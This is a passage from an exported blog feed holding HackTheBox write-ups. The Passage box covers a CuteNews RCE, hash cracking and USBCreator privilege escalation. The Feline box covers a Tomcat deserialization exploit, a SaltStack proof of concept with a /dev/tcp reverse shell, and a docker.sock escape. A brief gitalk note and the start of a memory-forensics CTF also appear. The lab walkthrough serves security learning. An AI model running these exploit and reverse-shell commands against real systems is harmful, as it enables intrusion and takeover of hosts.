fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Passage NewsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Sep 6 12:17:20 2020 -- 1 IP address (1 host up) scanned in 16.72 seconds We found the site has implement fail2ban, which it will block certain IP address if it touches the threshold, gobuster might not work here. http://www.passage.htb/cutenews Version CuteVews 2.1.2 , rating more towards CVE Use searchsploit ┌──(root💀kali)-[/opt/nmapAutomator/10.129.5.22/nmap]└─# searchsploit cutenews | grep 2.1.2CuteNews 2.1.2 - &#x27;avatar&#x27; Remote Code Execution (Metasploit) | php/remote/46698.rbCuteNews 2.1.2 - Arbitrary File Deletion | php/webapps/48447.txtCuteNews 2.1.2 - Authenticated Arbitrary File Upload | php/webapps/48458.txt Found Metasploit module, msfconsole was not able to search the module, therefore we have to add it manually. cp 46698.rb /usr/share/metasploit-framework/modules/exploits/linux/http/46698.rb and we will have error saying out file unable to load. Because there’s some error in this ruby file (Why offsec would keep bad module ?) &#x27;References&#x27; =&gt; [ [&#x27;URL&#x27;, &#x27;http://pentest.com.tr/exploits/CuteNews-2-1-2-Remote-Code-Execution-Metasploit.html&#x27;], // &lt;---- Add a comma here to fix [&#x27;URL&#x27;, &#x27;http://cutephp.com&#x27;] # Official Website First, we have to register a account Next, open up msfconsole, load the module we just added reload_all And this is our options msf5 exploit(linux/http/46698) &gt; optionsModule options (exploit/linux/http/46698): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD ikonw no Password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.129.5.22 yes The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27; RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /CuteNews yes Base CutePHP directory path USERNAME ikonw yes Username to authenticate with VHOST no HTTP server virtual hostPayload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.6 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Automatic msf5 exploit(linux/http/46698) &gt; run[*] Started reverse TCP handler on 10.10.14.6:4444 [*] http://10.129.5.22:80 - CuteNews is 2.1.2[+] Authentication was successful with user: ikonw[*] Trying to upload ouriwixb.php[+] Upload successfully.[*] Sending stage (38288 bytes) to 10.129.5.22[*] Meterpreter session 1 opened (10.10.14.6:4444 -&gt; 10.129.5.22:37850) at 2020-09-06 13:02:44 +0800 and we got the www-data user. We found 2 user nadav and paul www-data@passage:/home$ lslsnadav paul Went back to web directory for more enumeration, try to see if any config file stores the users cred Along the way we find out that CuteNews does not have database, all it’s data are store in PHP. For convivence, I zip the whole web folder and download it to local for more analysis. in cdata&#x2F;users folder we found some base64 ┌──(root💀kali)-[~/…/passage/CuteNews/cdata/users]└─# ls 09.php 16.php 32.php 42.php 5d.php 6c.php 73.php 7a.php 97.php b0.php c1.php d4.php d6.php fb.php lines0a.php 21.php 41.php 52.php 66.php 6e.php 77.php 8f.php 98.php b8.php c8.php d5.php e0.php fc.php users.txt┌──(root💀kali)-[~/…/passage/CuteNews/cdata/users]└─# cat 09.php&lt;?php die(&#x27;Direct call - access denied&#x27;); ?&gt;YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319 We extract out all the base64 hash and decrypt it at one ┌──(root💀kali)-[~/…/passage/CuteNews/cdata/users]└─# cat * | grep -v &#x27;&lt;?php&#x27; YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzI4MTtzOjk6InNpZC1tZWllciI7fX0=YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjU6ImFkbWluIjt9fQ==YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImtpbUBleGFtcGxlLmNvbSI7czo5OiJraW0tc3dpZnQiO319YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzIzNjtzOjEwOiJwYXVsLWNvbGVzIjt9fQ==YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJzaWQtbWVpZXIiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzI4MSI7czo0OiJuYW1lIjtzOjk6InNpZC1tZWllciI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToic2lkQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiU2lkIE1laWVyIjtzOjQ6InBhc3MiO3M6NjQ6IjRiZGQwYTBiYjQ3ZmM5ZjY2Y2JmMWE4OTgyZmQyZDM0NGQyYWVjMjgzZDFhZmFlYmI0NjUzZWMzOTU0ZGZmODgiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg1NjQ1IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzA0NztzOjU6ImFkbWluIjt9fQ==YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6InNpZEBleGFtcGxlLmNvbSI7czo5OiJzaWQtbWVpZXIiO319YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJraW0tc3dpZnQiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzMwOSI7czo0OiJuYW1lIjtzOjk6ImtpbS1zd2lmdCI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToia2ltQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiS2ltIFN3aWZ0IjtzOjQ6InBhc3MiO3M6NjQ6ImY2NjlhNmY2OTFmOThhYjA1NjIzNTZjMGNkNWQ1ZTdkY2RjMjBhMDc5NDFjODZhZGNmY2U5YWYzMDg1ZmJlY2EiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3MDk2IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIzIjt9fX0=YToxOntzOjQ6Im5hbWUiO2E6MTp7czo2OiJlZ3JlNTUiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg4Mjk4MzMiO3M6NDoibmFtZSI7czo2OiJlZ3JlNTUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo0OiJuaWNrIjtzOjY6ImVncmU1NSI7czo0OiJwYXNzIjtzOjY0OiI0ZGIxZjBiZmQ2M2JlMDU4ZDRhYjA0ZjE4ZjY1MzMxYWMxMWJiNDk0YjU3OTJjNDgwZmFmN2ZiMGM0MGZhOWNjIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czozOiJsdHMiO3M6MTA6IjE1OTg4MzQwNzkiO3M6MzoiYmFuIjtzOjE6IjAiO3M6NjoiYXZhdGFyIjtzOjI2OiJhdmF0YXJfZWdyZTU1X3Nwd3ZndWp3LnBocCI7czo2OiJlLWhpZGUiO3M6MDoiIjt9fX0=YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzMwOTtzOjk6ImtpbS1zd2lmdCI7fX0= we can see that is all serialized objects. array ( &#x27;name&#x27; =&gt; array ( &#x27;admin&#x27; =&gt; array ( &#x27;id&#x27; =&gt; &#x27;1592483047&#x27;, &#x27;name&#x27; =&gt; &#x27;admin&#x27;, &#x27;acl&#x27; =&gt; &#x27;1&#x27;, &#x27;email&#x27; =&gt; &#x27;nadav@passage.htb&#x27;, &#x27;pass&#x27; =&gt; &#x27;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&#x27;, &#x27;lts&#x27; =&gt; &#x27;1592487988&#x27;, &#x27;ban&#x27; =&gt; &#x27;0&#x27;, &#x27;cnt&#x27; =&gt; &#x27;2&#x27;, ), ),) it contains email and password hash. went to hash.org and we know it’s a sha256 hash. we collect all the hashes 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e14bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cdf669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc and we use john and rockyou to decrypt it ┌──(root💀kali)-[~/Desktop/hackthebox/Linux/passage]└─# john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 passwordUsing default input encoding: UTF-8Loaded 5 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 AVX 4x])Warning: poor OpenMP scalability for this hash type, consider --fork=4Will run 4 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statusatlanta1 (?)1g 0:00:00:01 DONE (2020-09-06 15:08) 0.8403g/s 12053Kp/s 12053Kc/s 48240KC/s (454579)..*7¡Vamos!Use the &quot;--show --format=Raw-SHA256&quot; options to display all of the cracked passwords reliablySession completed we got the password atlanta1 we manage su to paul account paul@passage:/var/www/html/CuteNews/cdata$ whoamiwhoamipaulpaul@passage:/var/www/html/CuteNews/cdata$ cd ~cd ~paul@passage:~$ lslsDesktop Downloads Music Public user.txtDocuments examples.desktop Pictures Templates Videospaul@passage:~$ cat user.txtcat user.txt3f0dfa31752b3222428868b631ebe589 After some enumeration authorized_keys only have one nadav value. That means key belongs nadav. This key can access to both nadav and paul paul@passage:~/.ssh$ cat authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage That means, nadav might have paul’s public key. We get the id_rsa key from paul and we are in ┌──(root💀kali)-[~/Desktop/hackthebox/Linux/passage]└─# ssh -i id_rsa nadav@10.129.5.22load pubkey &quot;id_rsa&quot;: invalid formatLast login: Sun Sep 6 00:21:36 2020 from 10.10.14.6nadav@passage:~$ RootAfter some enumeration from process list, we discover d-bus usbcreator is vulnerable to privilege escalation USBCreator D-Bus Privilege Escalation in Ubuntu Desktop We can directly overwrite arbitary files on the file system as root. Generate our own ssh key and write it to a file called ssh_key nadav@passage:~$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuSKqfg/WNLTFhnw+oY9nBwgoBZm4pRY0ZJHBykTQ9tU2XAR2AE1Hqzkqho7D1/b1sfSLOM1h53vxHzMewMO+xGxQ4n3xdoQmHy+BUJ8igkFlG630Jbu6AOJPU2vigmqr9rxdPSZCk5443tp8p4se2C9k7mOoYNZtRsHTuvq4uHOCOvlIaehIGDiI2zoatklvWdQ4dUDERM4gKo5U4VJ05DteQydkQuBKRTx4zYnO0+Tepkk424Q6aCaalwTfjFJTpEYRMLQrK6sGcijDJL2U/gHIjah3o8bR6aA5jy40P+3mFwMTW2lKAz+dhuyrtrBkvbiDeyrXBxAiDq/G5aiMTBVQA9vrfl0fpUGA2gY8/VqcuJ0cKWhSc3pzLzHO8dnElQD7+VCnJqRsxKjRMngJ5zJmyoIF/DRQZ2klnnW1chrFhi+kmegJuiQACjQqMiG8xgFJqJqy/jKbMMhNoul1y21Dx3de/K4c1LBsvYd0OGeckbLk7KDbxQ0snnVzKLDU= ikonw&quot; &gt; ssh_key Next called the dbus to overwrite to root’s authorized_keys nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/ssh_key /root/.ssh/authorized_keys true() and we got root ┌──(root💀kali)-[~/.ssh]└─# ssh -i id_rsa root@10.129.5.22 127 ⨯Last login: Sun Sep 6 02:23:55 2020 from 10.10.14.6root@passage:~# cat root.txt &amp;&amp; whoami &amp;&amp; hostnamead8b45d6ef52d901382e54b0d3ecb4adrootpassage","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"medium","slug":"medium","permalink":"https://ik0nw.github.io/tags/medium/"}]},{"title":"GitTalk 404 error","slug":"git_talk","date":"2020-09-05T00:00:00.000Z","updated":"2020-09-24T13:54:11.451Z","comments":true,"path":"2020/09/05/git_talk/","permalink":"https://ik0nw.github.io/2020/09/05/git_talk/","excerpt":"test","text":"test 因为无聊，想采用更花里胡哨的博客，决定用了hexo+github的配置。 期间在disqus和gitalk之间选择了 gitalk,因为后者在国内比disqus能更快的运行。 在使用gitalk中也是遇到了些许问题。关于如何安装gitalk我就不多说了。 重点是config 文件里配置的问题 gitalk: # gitalk. https://gitalk.github.io/ owner: Ik0nw #必须. GitHub repository 所有者，可以是个人或者组织。 admin: Ik0nw #必须. GitHub repository 的所有者和合作者 (对这个 repository 有写权限的用户)。 repo: Ik0nw.github.io #必须. GitHub repository. ClientID: xxxxx #必须. GitHub Application Client ID. ClientSecret: xxxxx #必须. GitHub Application Client Secret. owner跟admin 填写github的用户名 repo填写的是你博客repo的名字 而不是网址（假如你正在使用域名的话） 其实切记你的博客的repo一定要设置为公共，如果设置为私有，gitalk将无法访问。 （我在这里转了1个多小时 哭….）","categories":[],"tags":[{"name":"gitalk","slug":"gitalk","permalink":"https://ik0nw.github.io/tags/gitalk/"}]},{"title":"HTB Feline Writeup","slug":"HTB-Feline","date":"2020-08-30T00:00:00.000Z","updated":"2021-10-10T03:29:47.419Z","comments":true,"path":"2020/08/30/HTB-Feline/","permalink":"https://ik0nw.github.io/2020/08/30/HTB-Feline/","excerpt":"","text":"Author: IkonwNmap scan: Making a script scan on all ports Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 06:52 EDTNmap scan report for 10.10.10.205Host is up (0.0066s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)8080/tcp open http Apache Tomcat 9.0.27|_http-title: VirusBucketService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds The web seems something related to online malware analyze? only service are available Found out script.js is loaded let photo = document.getElementById(&quot;uploadFile&quot;).files[0];let req = new XMLHttpRequest();let email = document.getElementById(&quot;email&quot;).value;let formData = new FormData();formData.append(&quot;image&quot;, photo);await fetch(&#x27;/upload.jsp?email=&#x27; + email , &#123; method: &quot;POST&quot;, body: formData&#125;) .then(response=&gt;response.text()) .then(data=&gt;&#123; if(data.includes(&quot;successfully&quot;)) &#123; document.getElementById(&quot;msg&quot;).innerText = &quot;Upload successful! The report will be sent via e-mail.&quot;; &#125; else &#123; document.getElementById(&quot;msg&quot;).innerText = &quot;File upload failed&quot;; &#125; &#125;) .catch(function(error) &#123; document.getElementById(&quot;msg&quot;).innerText = &quot;File upload failed&quot;; &#125;); Not too interesting, it fetch the upload.jsp However if we upload an empty filename, it will cause the jsp to obtain an error. We found out the upload directory address &#x2F;opt&#x2F;samples&#x2F;uploads the upload directory is not within the web directory, I have no way to execute malicious payload and execute it through URL. After viewing the rating, it is a CVE-like Box. I don’t see any CMS or suspicious port So I went to google about the Apache Tomcat 9.0.27 And I found CVE-2020-9484 It has some prerequisites for this vulnerability - The persistentManager is enabled and it&#x27;s using a *FileStore* (Not too sure if this is enabled)- The attacker is able to upload a file with arbitrary content, has control over the filename and knows the location where it is uploaded (We know the uploaded directory)- There are gadgets in the *classpath* that can be used for a java deserialization attack Docker environment First, we have to generate a deserialization object session using ysoserial Do take note that, due to Runtime.getRunTime().exec the arguments with spaces are broken by the StringTokenizer class. We have to use base64 to encoding to reduce these issues Reference ┌──(root💀kali)-[~/Desktop/docker/ysoserial]└─# java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 &quot;$command&quot; &gt; ~/Desktop/hackthebox/Linux/feline/xing.session Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true ┌──(root💀kali)-[~]└─# curl &#x27;http://10.129.6.132:8080/upload.jsp&#x27; -H &#x27;Cookie: JSESSIONID=../../../../../../../../opt/samples/uploads/xing&#x27; Using curl to pass the JSESSIONID and trigger the malicious session we sent. And we got the shell back. The user flag located at &#x2F;home&#x2F;tomcat&#x2F;user.txt RootVia enumeration of network connection we found out 2 suspicious port 4506 and 4505 tomcat@VirusBucket:/opt/tomcat$ netstat -ntlpnetstat -ntlpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:4505 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:4506 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:33443 0.0.0.0:* LISTEN - tcp6 0 0 :::8080 :::* LISTEN 975/java tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 127.0.0.1:8005 :::* LISTEN 975/java After google we found it’s saltstack CVE-2020-11651 And we manage to find the CVE, after we upload the poc, we found the victim doesn’t have python3 salt module. We do a port forwarding using chisel Chisel Github Client&gt;&gt; ./chisel_linux client &lt;your ip&gt;:&lt;Port&gt; -R:4506:127.0.0.1:4506Server&gt;&gt; ./chisel_linux server -p &lt;Port&gt; --reverse Now we have the target port 4506 forward to our port 7777 Run the POC and execute the bash reverse shell command. And we got the shell back python3 cve_2020-11651.py --exec &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.16/1234 0&gt;&amp;1&quot;&#x27; However we didnt root the box just so easy. We have the escape the docker environment, get to the host. root@2d24bf61767c:~# cat todo.txtcat todo.txt- Add saltstack support to auto-spawn sandbox dockers through events.- Integrate changes to tomcat and make the service open to public. After some enumeration, at the .bash_history cat todo.txt printf -- &#x27;- Add saltstack support to auto-spawn sandbox dockers through events.\\n- Integrate changes to tomcat and make the service open to public.\\n&#x27; &gt; todo.txtcd /home/tomcatcat /etc/passwdexitcd /root/lscat todo.txt ls -la /var/run/curl -s --unix-socket /var/run/docker.sock http://localhost/images/jsonexit &#x2F;var&#x2F;run&#x2F;docker.sock is used in this case. docker.sock is a unix socket of docker daemon listens on default, it can be used to communicate with the daemon from within a container. We are allow to send commands through the docker.sock to the docker daemon though API. that means, we can create a new docker which volume bind to the whole host folder and execute malicious commands. Escaping the Whale: Things you probably shouldn’t do with Docker (Part 1) According the reference, first we have to get the current docker image curl -XGET --unix-socket /var/run/docker.sock http://localhost/containers/json &#123; &quot;Id&quot;:&quot;2d24bf61767ce2a7a78e842ebc7534db8eb1ea5a5ec21bb735e472332b8f9ca2&quot;, &quot;Names&quot;:[ &quot;/saltstack&quot; ], &quot;Image&quot;:&quot;188a2704d8b0&quot;, &quot;ImageID&quot;:&quot;sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9&quot;, &quot;Command&quot;:&quot;/usr/bin/dumb-init /usr/local/bin/saltinit&quot;, &quot;Created&quot;:1593520419, &quot;Ports&quot;:[ &#123; &quot;IP&quot;:&quot;127.0.0.1&quot;, &quot;PrivatePort&quot;:4505, &quot;PublicPort&quot;:4505, &quot;Type&quot;:&quot;tcp&quot; &#125;, &#123; &quot;IP&quot;:&quot;127.0.0.1&quot;, &quot;PrivatePort&quot;:4506, &quot;PublicPort&quot;:4506, &quot;Type&quot;:&quot;tcp&quot; &#125;, &#123; &quot;IP&quot;:&quot;127.0.0.1&quot;, &quot;PrivatePort&quot;:8000, &quot;PublicPort&quot;:8000, &quot;Type&quot;:&quot;tcp&quot; &#125;, &#123; &quot;PrivatePort&quot;:22, &quot;Type&quot;:&quot;tcp&quot; &#125; ], &quot;Labels&quot;:&#123; &#125;, &quot;State&quot;:&quot;running&quot;, &quot;Status&quot;:&quot;Up 13 hours&quot;, &quot;HostConfig&quot;:&#123; &quot;NetworkMode&quot;:&quot;default&quot; &#125;, &quot;NetworkSettings&quot;:&#123; &quot;Networks&quot;:&#123; &quot;bridge&quot;:&#123; &quot;IPAMConfig&quot;:null, &quot;Links&quot;:null, &quot;Aliases&quot;:null, &quot;NetworkID&quot;:&quot;c344406a0931eb00e8d81114b992959ed104064affada4bc6932702e39c45141&quot;, &quot;EndpointID&quot;:&quot;a5e320e6a582086035e03f58b570d922c3c7c8be7f782222b47f7421b9bca4e5&quot;, &quot;Gateway&quot;:&quot;172.17.0.1&quot;, &quot;IPAddress&quot;:&quot;172.17.0.2&quot;, &quot;IPPrefixLen&quot;:16, &quot;IPv6Gateway&quot;:&quot;&quot;, &quot;GlobalIPv6Address&quot;:&quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;:0, &quot;MacAddress&quot;:&quot;02:42:ac:11:00:02&quot;, &quot;DriverOpts&quot;:null &#125; &#125; &#125;, &quot;Mounts&quot;:[ &#123; &quot;Type&quot;:&quot;bind&quot;, &quot;Source&quot;:&quot;/var/run/docker.sock&quot;, &quot;Destination&quot;:&quot;/var/run/docker.sock&quot;, &quot;Mode&quot;:&quot;&quot;, &quot;RW&quot;:true, &quot;Propagation&quot;:&quot;rprivate&quot; &#125; ] &#125;] Now we have the docker image name Let’s create a json configuration file echo -e &#x27;&#123;&quot;Image&quot;:&quot;188a2704d8b0&quot;,&quot;Cmd&quot;:[&quot;/bin/sh&quot;],&quot;DetachKeys&quot;:&quot;Ctrl-p,Ctrl-q&quot;,&quot;OpenStdin&quot;:true,&quot;Mounts&quot;:[&#123;&quot;Type&quot;:&quot;bind&quot;,&quot;Source&quot;:&quot;/root&quot;,&quot;Target&quot;:&quot;/host_etc&quot;&#125;]&#125;&#x27; &gt; container.json and we create the image using the container.json configuration file curl -XPOST -H &quot;Content-Type: application/json&quot; --unix-socket /var/run/docker.sock -d &quot;$(cat container.json)&quot; http://localhost/containers/create Next start our malicious container curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/2aba/start replace the 32d862 to the image id your created after start the docker,use socat connect to the docker socket, however the machine doesnt have socat, we have to upload our own socat binary root@2d24bf61767c:~# which wgetwhich wget/usr/bin/wgetroot@2d24bf61767c:~# which socatwhich socatroot@2d24bf61767c:~# lslstodo.txtroot@2d24bf61767c:~# wget 10.10.14.16:1337/socatwget 10.10.14.16:1337/socat--2020-09-02 07:14:12-- http://10.10.14.16:1337/socatConnecting to 10.10.14.16:1337... connected.HTTP request sent, awaiting response... 200 OKLength: 375176 (366K) [application/octet-stream]Saving to: ‘socat’ 0K .......... .......... .......... .......... .......... 13% 2.99M 0s 50K .......... .......... .......... .......... .......... 27% 6.38M 0s 100K .......... .......... .......... .......... .......... 40% 32.3M 0s 150K .......... .......... .......... .......... .......... 54% 7.64M 0s 200K .......... .......... .......... .......... .......... 68% 12.8M 0s 250K .......... .......... .......... .......... .......... 81% 6.75M 0s 300K .......... .......... .......... .......... .......... 95% 522K 0s 350K .......... ...... 100% 135M=0.1s2020-09-02 07:14:12 (2.58 MB/s) - ‘socat’ saved [375176/375176]root@2d24bf61767c:~# chmod +x socatchmod +x socat socat - UNIX-CONNECT:/var/run/docker.sockPOST /containers/2aba/attach?stream=1&amp;stdin=1&amp;stdout=1&amp;stderr=1 HTTP/1.1Host:Connection: UpgradeUpgrade: tcp and if it sucess, we receive HTTP/1.1 101 UPGRADEDContent-Type: application/vnd.docker.raw-streamConnection: UpgradeUpgrade: tcp and we are able to access the folder and get the root flag now.","categories":[{"name":"HackTheBox-Hard","slug":"HackTheBox-Hard","permalink":"https://ik0nw.github.io/categories/HackTheBox-Hard/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"hard","slug":"hard","permalink":"https://ik0nw.github.io/tags/hard/"}],"author":"Ikonw"},{"title":"Defcon DFIR memory forensic CTF 2019","slug":"Defcon-DFIR-memory_forensic","date":"2020-08-22T00:00:00.000Z","updated":"2020-09-20T06:49:56.604Z","comments":true,"path":"2020/08/22/Defcon-DFIR-memory_forensic/","permalink":"https://ik0nw.github.io/2020/08/22/Defcon-DFIR-memory_forensic/","excerpt":"","text":"Memory Image: https://www.dropbox.com/sh/4qfk1miauqbvqst/AAAVCI1G8Sc8xMoqK_TtmSbia?dl=0Question 1:What is the SHA1 hash of triage.mem?Flag Format-flag&lt;xyz&gt;Everything after the – is what you need to submit, your answer is the xyx. Solution:kali Desktop/forensic_images » sha1sum memory.mem c95e8cc8c946f95a109ea8e47a6800de10a27abd memory.mem Question 2:What profile is the most appropriate for this machine? (ex: Win10x86_14393)Flag Format-flag&lt;xyz&gt;Everything after the – is what you need to submit, your answer is the xyx. The first step of volatility is always find the image info of the memory dump. kali Desktop/forensic_images » volatility imageinfo -f memory.mem Volatility Foundation Volatility Framework 2.6INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (/root/Desktop/forensic_images/memory.mem) PAE type : No PAE DTB : 0x187000L KDBG : 0xf800029f80a0L Number of Processors : 2 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff800029f9d00L KPCR for CPU 1 : 0xfffff880009ee000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2019-03-22 05:46:00 UTC+0000 Image local date and time : 2019-03-22 01:46:00 -0400 Got the answer as Win7SP1x64 Question 3:What was the process ID of notepad.exe?Flag Format-flag&lt;xyz&gt;Everything after the – is what you need to submit, your answer is the xyx. Solution:We indicated the profile and use the pslist plugin to print all the running process kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 pslist | grep notepadVolatility Foundation Volatility Framework 2.60xfffffa80054f9060 notepad.exe 3032 1432 1 60 1 0 2019-03-22 05:32:22 UTC+0000 and we got the answer pid as 3032 Question 4:Name the child processes of wscript.exe.Flag Format-flag&lt;xyz&gt;Everything after the – is what you need to submit, your answer is the xyx. Solution:pstree will indicate child process using idention and periods. Let’s grep the top and bottom 3 line of process wscript.exe kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 pstree | grep -C 3 wscript.exe Volatility Foundation Volatility Framework 2.6. 0xfffffa8004798320:calc.exe 3548 1432 3 77 2019-03-22 05:34:43 UTC+0000. 0xfffffa80053d3060:POWERPNT.EXE 4048 1432 23 765 2019-03-22 05:35:09 UTC+0000. 0xfffffa8004905620:hfs.exe 3952 1432 6 214 2019-03-22 05:34:51 UTC+0000.. 